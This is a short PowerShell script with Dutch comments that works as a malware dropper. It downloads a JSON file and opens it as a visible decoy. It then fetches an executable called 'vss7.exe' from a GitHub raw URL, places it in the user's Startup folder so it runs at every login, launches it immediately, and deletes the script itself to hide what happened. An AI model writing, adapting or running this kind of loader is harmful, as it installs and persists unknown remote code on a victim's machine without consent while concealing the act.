# 1. Definieer de URL's en paden
$jsonUrl = "https://raw.githubusercontent.com/my-cloud-drive/my-file-share/refs/heads/main/files.json"
$exeUrl  = "https://raw.githubusercontent.com/my-cloud-drive/my-file-share/refs/heads/main/files/vss%207.exe"

# 2. Bepaal de locaties
# JSON komt naast het script, EXE gaat naar de Startup map
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$jsonFile = Join-Path $PSScriptRoot "files.json"
$exeFile  = Join-Path $startupFolder "vss7.exe"

try {
    # 3. Download en OPEN de JSON (zichtbaar voor de gebruiker)
    Invoke-WebRequest -Uri $jsonUrl -OutFile $jsonFile
    Invoke-Item $jsonFile

    # 4. Download de EXE naar de Startup map
    Invoke-WebRequest -Uri $exeUrl -OutFile $exeFile

    # 5. START de EXE nu ook meteen op
    Start-Process -FilePath $exeFile

    # 6. Self-destruct: Wacht heel even en verwijder dan dit script
    Start-Sleep -Seconds 2
    Remove-Item $MyInvocation.MyCommand.Definition -Force
}
catch {
    # Alleen zichtbaar bij handmatig testen
    Write-Host "Fout: $_"
}